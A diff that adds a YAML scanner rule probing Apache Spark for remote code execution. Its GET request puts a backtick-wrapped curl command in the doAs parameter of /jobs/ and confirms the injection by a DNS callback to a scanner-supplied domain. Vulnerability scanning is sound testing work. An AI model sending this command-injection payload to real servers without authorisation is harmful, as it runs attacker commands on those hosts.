@@ -1,0 +1,9 @@
+name: Apache-Spark-RCE
+description: "DNSlog探测成功"
+matchCount: 1
+rules:
+  - method: GET
+    dnslog: domain
+    path: "/jobs/?doAs=`curl+{{domain}}`"
+    expression:
+      dnslogCheck: true
